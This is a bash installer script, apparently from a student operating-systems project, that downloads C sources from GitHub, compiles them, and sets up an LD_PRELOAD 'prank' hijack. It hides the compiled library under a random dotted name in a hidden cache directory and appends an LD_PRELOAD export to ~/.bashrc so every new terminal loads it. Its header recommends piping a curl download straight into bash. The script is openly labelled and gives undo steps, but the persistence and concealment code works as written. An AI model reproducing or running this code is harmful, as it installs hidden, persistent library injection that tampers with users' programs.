#!/bin/bash

#IMPORTANT NOTE: READ ME BEFORE EXECUTING!!!: 
# This Script makes the hijack work for every new opened Terminal after execution !!
#
#
# run with: 
# bash <(curl -s https://raw.githubusercontent.com/carina-fehr/osProject/main/LinkOS.sh)
#
# How to undo it:
# 
# remove the 2 last LD_PRELOAD lines on the ~/bashrc file with: 
# "nano ~/.bashrc" and scroll to bottom 
#
# "unset LD_PRELOAD" still works but only for the active terminal. 
set -euo pipefail

REPO_URL="https://raw.githubusercontent.com/carina-fehr/osProject/main"
SRC="KCapp.c"
BIN="KCapp"

workdir="$(mktemp -d)"
trap 'rm -rf "$workdir"' EXIT

curl -sSL "$REPO_URL/$SRC" -o "$workdir/$SRC"

gcc "$workdir/$SRC" -o "$workdir/$BIN"

sudo mv "$workdir/$BIN" /usr/local/bin/
sudo chmod 755 /usr/local/bin/$BIN

REPO_URL="https://raw.githubusercontent.com/carina-fehr/osProject/main"
C_FILE="preloadLib.c"
SO_NAME="preloadLib.so"
BASHRC="$HOME/.bashrc"
HIDDEN_DIR="$HOME/.cache/.syslib"
MARKER="# [LD_PRELOAD injected]"

NEW_NAME=".lib$(head /dev/urandom | tr -dc a-z0-9 | head -c 8).so"
HIDDEN_SO="$HIDDEN_DIR/$NEW_NAME" # hides the .so in a hidden directory with a random name 

echo "[*] Starting installation..."
sleep 1
echo "Have fun copying my homework!"
sleep 1
echo "[*] Downloading C file from GitHub..."
wget -q -O "$C_FILE" "$REPO_URL/$C_FILE"

# Check if .c exists
if [ ! -s "$C_FILE" ]; then
    echo "Error: Failed to download $C_FILE or file is empty."
    exit 1
fi

# Compile the .so from the .c file
gcc -shared -fPIC -o "$SO_NAME" "$C_FILE" -ldl

# Create hidden directory
mkdir -p "$HIDDEN_DIR"

# Copy and rename the .so file
cp "$SO_NAME" "$HIDDEN_SO"
chmod 755 "$HIDDEN_SO"

# Remove any previous injection first
sed -i "/$MARKER/,+2d" "$BASHRC"

# Inject LD_PRELOAD into .bashrc
echo "" >> "$BASHRC"
echo "$MARKER" >> "$BASHRC"
echo "export LD_PRELOAD=\"$HIDDEN_SO\"" >> "$BASHRC"
echo "alias geary='DISABLE_WRITE_PRANK=1 geary'" >> "$BASHRC"

# Cleanup
rm -f "$SO_NAME"

echo "[*] Install complete."
echo "[!] Open a new terminal to continue testing."
echo "[!] Original .so deleted, have fun trying to find it ;)"

# Launch new bash session without getchar prank
DISABLE_GETCHAR_PRANK=1 bash
